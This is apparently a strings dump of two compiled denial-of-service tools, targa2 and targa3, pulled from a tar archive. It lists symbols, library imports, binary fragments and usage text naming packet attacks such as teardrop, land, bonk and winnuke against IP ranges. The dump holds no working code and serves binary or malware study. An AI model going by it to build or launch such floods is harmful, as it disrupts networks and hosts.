            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "targa.c",
            "ip_bytes.18",
            "land_port.37",
            "tear_frags",
            "iplen",
            "endip",
            "_DYNAMIC",
            "targa_help",
            "quit",
            "host_to_ip",
            "host",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "targa",
            "datalen",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "htonl@@GLIBC_2.0",
            "teardrop",
            "hax0r",
            "bcopy@@GLIBC_2.0",
            "winnuke_s",
            "inet_ntoa@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "bonk",
            "nestea",
            "malloc@@GLIBC_2.0",
            "land",
            "spf_sck",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "name_resolve",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "newt_frags",
            "psize",
            "time@@GLIBC_2.0",
            "udplen",
            "_start",
            "startip",
            "strlen@@GLIBC_2.0",
            "winnuke_sub",
            "send_nes",
            "jolt",
            "winnuke",
            "addr",
            "inet_addr@@GLIBC_2.0",
            "leet_resolve",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "fondle",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "getopt_long@@GLIBC_2.0",
            "newtear",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "syndrop",
            "sscanf@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "send@@GLIBC_2.0",
            "htons@@GLIBC_2.0",
            "memset@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "send_synd",
            "strncpy@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "checksum",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "spoofedaddr",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "rand@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/targa2",
            "0100755",
            "0000000",
            "0000000",
            "00000051120",
            "07061546650",
            "013246",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "random",
            "connect",
            "usleep",
            "memcpy",
            "perror",
            "malloc",
            "optarg",
            "socket",
            "bzero",
            "send",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "strncpy",
            "htonl",
            "sendto",
            "bcopy",
            "sscanf",
            "getopt",
            "memset",
            "srand",
            "inet_ntoa",
            "time",
            "gethostbyname",
            "sprintf",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "strlen",
            "__register_frame_info",
            "close",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "]U]U4",
            "4]U]",
            "REP1",
            "rEnt*n",
            "ht;Itt",
            "EPPh",
            "EPh@",
            "EPhd",
            "E;E|",
            "EPEPS",
            "E\u0450h|",
            "E[t&",
            "Uu>E",
            "REPEP",
            "E\u540dt&",
            "EMffM",
            "1'EP",
            "E;E|",
            "GEPEPEPP<",
            "Shdd",
            "E;@~",
            "Pf\u01c5L",
            "hPEP",
            "}'HPh",
            "EQEP",
            "fE1fE",
            "f9Er",
            "UlMMEH",
            "t!EP",
            "Uu'E",
            "fUfu",
            "j(EPY",
            "j EP",
            "EEEEE",
            "REPy",
            "j EPw",
            "j(EPEPs",
            "U$SE",
            "E\u070bE\u0709E}",
            "EE\u070bEPj",
            "EE\u070bEP",
            "E\u070bEP",
            "E\u070bE\u0709E}",
            "u'h ",
            "E\u070bEP",
            "E\u070bEPV",
            ")\u044bE)\u0209E\u070bEfEE\u0739",
            ")\u044bE)\u0209E\u070bEfEE",
            "EE\u070bE\u0709EEE\u070bE\u0709EE",
            "EE\u070bE;E|",
            "EE\u070bEP",
            "EE\u070bEPEE\u070bEPEE\u070bEPEE\u070bEPW",
            "E\u070bEP",
            "E\ub24bEE\u070bEPN",
            "U,VSE",
            "U\u050bEfEUfUE",
            "EfE\u060bUfU\u078bE",
            "E\u060bU\u0609UhD",
            "E\u060bE\u0609EUU\u060bE\u0609Eh",
            "UU\u060bEP",
            "UU\u060bEPUU\u060bEP",
            "fE\u060bUU\u050bU\u060bEf",
            "fE\u060bEE\u050bE\u060bUf",
            "fE\u060bUU\u050bMUf",
            "EE\u060bUf",
            "EE\u060bURE@E\u060bUR",
            "EE\u060bU",
            "U\u050bU\u050bE\u0609",
            "EE\u060bU",
            "U\u050bU\u050bE\u0609",
            "EE\u060bUR0",
            "fE\u060bEE\u050bE\u060bUf",
            "UU\u060bEP",
            "fE\u060bUU\u050bU\u060bEf",
            "fE\u060bEE\u050bE\u060bUf",
            "U\u0709U\u050bE\u0509E\u060bURj",
            "j&EE\u060bURE",
            "E\u060bUR",
            "E\u0603}u0hX",
            "EE\u060bURX",
            "EE\u060bU\u0609Uh",
            "EE\u060bUR",
            "EE\u060bUREE\u060bUR",
            "fE\u060bEE\u050bE\u060bUf",
            "fE\u060bUU\u050bU\u060bEf",
            "fE\u060bEE\u050bE\u060bUf",
            "UU\u060bEf",
            "UU\u060bEPUBU\u060bEP",
            "UU\u060bE",
            "E\u050bE\u050bU\u0609",
            "UU\u060bE",
            "E\u050bE\u050bU\u0609",
            "UU\u060bEP=",
            "fE\u060bUU\u050bU\u060bEf",
            "EE\u060bUR",
            "fE\u060bEE\u050bE\u060bUf",
            "fE\u060bUU\u050bU\u060bEf",
            "E\u0709E\u050bU\u0509U\u060bEPj",
            "UU\u060bEPU",
            "U\u060bEP",
            "E\u0603}u*hX",
            "UU\u060bEPb",
            "UU\u060bE\u0609EhD",
            "UU\u060bEP",
            "UU\u060bEPUU\u060bEP",
            "fE\u060bUU\u050bU\u060bEf",
            "fE\u060bEE\u050bE\u060bUf",
            "fE\u060bUU\u050bU\u060bEf",
            "EE\u060bUf",
            "EE\u060bURE@E\u060bUR",
            "EE\u060bU",
            "U\u050bU\u050bE\u0609",
            "EE\u060bU",
            "U\u050bU\u050bE\u0609",
            "EE\u060bURJ",
            "fE\u060bEE\u050bE\u060bUf",
            "UU\u060bEP ",
            "fE\u060bUU\u050bU\u060bEf",
            "fE\u060bEE\u050bE\u060bUf",
            "`E\u060bUU\u050bME",
            "\u0209E\u053bE\u044bE\u060d",
            ")\u02cbU)\u0689U\u060aE\u060bU\u0508",
            "EE\ub5c9j",
            "E\u0709E\u050bU\u0509U\u060bEPj",
            "UU\u060bEPU",
            "U\u060bEP2",
            "E\u0603}u)hX",
            "UU\u060bEP",
            "UU\u060bEP",
            "e[^]",
            "Uu>E",
            "REPEP",
            "U$SE",
            "E\u070bE\u0709E}",
            "EE\u070bEPj",
            "EE\u070bEP",
            "E\u070bEP",
            "E\u070bE\u0709E}",
            "u'h ",
            "E\u070bEP%",
            "E\u070bEP",
            ")\u044bE)\u0209E\u070bEfEE\u0739",
            ")\u044bE)\u0209E\u070bEfEE",
            "EE\u070bE\u0709EEE\u070bE\u0709EE",
            "EE\u070bE;E|",
            "EE\u070bEP",
            "EE\u070bEPEE\u070bEPEE\u070bEPEE\u070bEPW",
            "E\u070bEP",
            "E\ub24bEE\u070bEP",
            "U SE",
            "fEfUE",
            "EfEE",
            "EEEj0EP]",
            "EPEP",
            "EPE@P",
            "j0EPE",
            "u*hX",
            "u#hX",
            "U,SE",
            "E\u050bE\u0509E}",
            "EE\u050bEPj",
            "EE\u050bEPq",
            "E\u050bEPK",
            "E\u050bE\u0509E}",
            "u)h ",
            "E\u050bEP",
            "E\u050bEP",
            ")\u044bE)\u0209E\u050bEfE\\E\u0539",
            ")\u044bE)\u0209E\u050bEfEE",
            "EE\u050bE\u0509E\u060bEE\u050bE\u0509EE",
            "EE\u050bE;E|",
            "E\u0709E\u050bEPEE\u050bEP",
            "EE\u050bEP",
            "EE\u050bEPEE\u050bEPEE\u050bEPEE\u050bEPP",
            "E\u050bEP;",
            "EoEE\u050bEP",
            "U SE",
            "fEfUE",
            "EfEE",
            "EEEj0EP",
            "EPEPw",
            "EPE@P",
            "EEU M",
            "j<EPE",
            "u$hX",
            "]EU ",
            "u#hX",
            "U$SE",
            "E\u070bE\u0709E}",
            "EE\u070bEPj",
            "EE\u070bEP",
            "E\u070bEPi",
            "E\u070bE\u0709E}",
            "u'h ",
            "E\u070bEP",
            "E\u070bEP6",
            ")\u044bE)\u0209E\u070bEfE|E\u0739",
            ")\u044bE)\u0209E\u070bEfEE",
            "EE\u070bE\u0709EEE\u070bE\u0709EE",
            "EE\u070bE;E|",
            "EE\u070bEP",
            "EE\u070bEPEE\u070bEPEE\u070bEPEE\u070bEPG",
            "E\u070bEPr",
            "U SE",
            "fEfUE",
            "EfEE",
            "Ej8V",
            "EEEj8EP",
            "EPEP",
            "EPE@PD",
            "j8EPE",
            "u*hX",
            "u#hX",
            "t!EP",
            "uEPj",
            "EPPEPS",
            "WVSU",
            "e[^_]",
            "EEE]",
            "]j$j",
            "j\tEP",
            "j$EPE",
            "UlWVE",
            "EPEPEPEPh",
            "RE\u020bP",
            "RE\u020bP",
            "fEMM\u030bEf",
            "PE\u020bP",
            "j$EPEP]",
            "e^_]",
            "EPEPC",
            "EEEj(j",
            "PEP9",
            "j(EPE",
            "EEPR",
            "\u0403;u]]U]S",
            "[1;33mtarga 2.1 by ",
            "[0;34m",
            "[5mMixter",
            "-help",
            "--help",
            "%d.%d.%d.%d",
            "Error, %s: Please use a start IP containing 4 zones",
            "Zone 1 of start ip is incorrect (greater than 255)",
            "Zone 2 of start ip is incorrect (greater than 255)",
            "Zone 3 of start ip is incorrect (greater than 255)",
            "Zone 4 of start ip is incorret (greater than 255)",
            "Error, %s: Please use an end IP containing 4 zones",
            "Zone 1 of end ip is incorrect (greater than 255)",
            "Zone 2 of end ip is incorrect (greater than 255)",
            "Zone 3 of end ip is incorrect (greater than 255)",
            "Zone 4 of end ip is incorrect (greater than 255)",
            "Zone 1 of start ip and end ip is different",
            "Zone 2 of start ip and end ip is different",
            "Zone 3 of start ip and end ip is different",
            "t:n:h",
            "[1;31mLeet",
            "[0;31mness on f",
            "[1;31mlaxen wing",
            "[0;31ms",
            "[0m:",
            "[1;31mTo",
            "[0m: ",
            "[0;31m%s - %s",
            "[1;31mRepeats",
            "[0m: ",
            "[0;31m%5d",
            "[1;31m   Type",
            "[0m: ",
            "[0;31m%5d",
            "[0;31m%s ",
            "[1;31m[ ",
            "[0;31m ]",
            "[1;31m-all done-",
            "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats]",
            "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats]",
            "startIP - endIP: ",
            "[1;31mIP range to send packets to (destination)",
            "[0;31mstart and end must be on the same C class (1.1.1.X)",
            "repeats: ",
            "[1;31mrepeat the whole cycle n times (default is 1)",
            "[0;31mtype: ",
            "[1;31mkind of remote DoS to send (default is 0)",
            "[0;31m1 = bonk (",
            "[1;31m$",
            "[0;31m)  2 = jolt (",
            "[1;32m@",
            "[0;31m)  3 = land (",
            "[1;33m-",
            "[0;31m)",
            "4 = nestea (",
            "[1;34m.",
            "[0;31m)  5 = newtear (",
            "[1;32m#",
            "[0;31m)",
            "6 = syndrop (",
            "[1;35m&",
            "[0;31m)  7 = teardrop (",
            "[1;34m%%",
            "[0;31m)  8 = winnuke (",
            "[1;37m*",
            "[0;31m)",
            "9 = 1234 (",
            "[1;38m!",
            "[0;31m)  10 = saihyousen (",
            "[1;36m+",
            "[0;31m)  11 = oshare (",
            "[0;33m|",
            "[0;31m)",
            "[0;31m0 = use all remote DoS types at once",
            "bad target host",
            "socket()",
            "IP_HDRINCL",
            "[1;31m$",
            "socket",
            "%s: unknown host",
            "[1;32m@",
            "offset %d: ",
            "sendto",
            "unknown host %s",
            "couldn't send packet",
            "[1;33m-",
            "raw socket",
            "What the hell kind of IP address is that?",
            "[1;34m.",
            "sendto",
            "[1;32m#",
            "[1;35m&",
            "[1;34m%%",
            "bill_loves_you!",
            "gethostbyname()",
            "connect()",
            "[1;37m*",
            "[1;38m!",
            "%i.%i.%i.%i",
            "[1;36m+",
            "[0;33m|",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "GCC: (GNU) pgcc-2.91.66 19990314 (egcs-1.1.2 release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".comment",
            ".note",
            "datapool/bin/targa3",
            "0100755",
            "0000000",
            "0000000",
            "00000037413",
            "07100656714",
            "013255",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "stdout",
            "random",
            "snprintf",
            "getpid",
            "puts",
            "socket",
            "fflush",
            "calloc",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "setsockopt",
            "rand",
            "signal",
            "read",
            "sendto",
            "srand",
            "time",
            "strcmp",
            "stderr",
            "srandom",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "open",
            "__register_frame_info",
            "free",
            "GLIBC_2.0",
            "1^PTRh",
            "U$S@",
            "\u0619}\u044bEMP",
            "]\u0609]U",
            "EP EPh\u07d1",
            "~'h@",
            "EE!}",
            "u#hg",
            "EP EPEPh|",
            "UEPj",
            "EEEj",
            "EP fE",
            "E@9E|",
            "E\u0101=$",
            "EPEP@",
            "1fEP",
            "P\tj\tj",
            "REPEPEP",
            "EP> EPh",
            "\u0403;u[]",
            "/dev/urandom",
            "[%d;3%dm",
            "\t\t%starga 3.0 by Mixter",
            "usage: %s <ip1> [ip2] ... [-c count]",
            "cannot target more than 200 hosts!",
            "no valid ips found!",
            "%s\tTargets:\t%d",
            "\tCount:\t\t",
            "infinite",
            "   [ ",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "targa3.c",
            "getpid@@GLIBC_2.0",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "strcmp@@GLIBC_2.0",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "signal@@GLIBC_2.0",
            "fflush@@GLIBC_2.0",
            "sigh",
            "random@@GLIBC_2.0",
            "puts@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "rseed",
            "stdout@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "realrand",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
